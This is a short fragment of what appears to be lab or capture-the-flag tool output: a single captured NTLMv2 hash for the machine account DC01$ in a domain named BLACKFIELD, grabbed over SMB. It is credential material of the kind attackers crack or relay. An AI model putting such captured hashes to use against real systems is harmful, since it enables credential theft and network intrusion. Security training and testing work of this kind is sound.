[SMB] NTLMv2-SSP Hash     : DC01$::BLACKFIELD:5ef4d4338969dd2d:1BD769F08F0D02DA39C21B52F3846C18:010100000000000080EFCBB23F5ADA0133B37CFDF0050A2E0000000002000800440052004600340001001E00570049004E002D0037004F003600460041004200480036004F0044004B0004003400570049004E002D0037004F003600460041004200480036004F0044004B002E0044005200460034002E004C004F00430041004C000300140044005200460034002E004C004F00430041004C000500140044005200460034002E004C004F00430041004C000700080080EFCBB23F5ADA0106000400020000000800300030000000000000000000000000400000849274BBFC4535BC541CC74BF3E3591DA3393A1C3F2FF4076FC79B652D8CE1390A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000
```

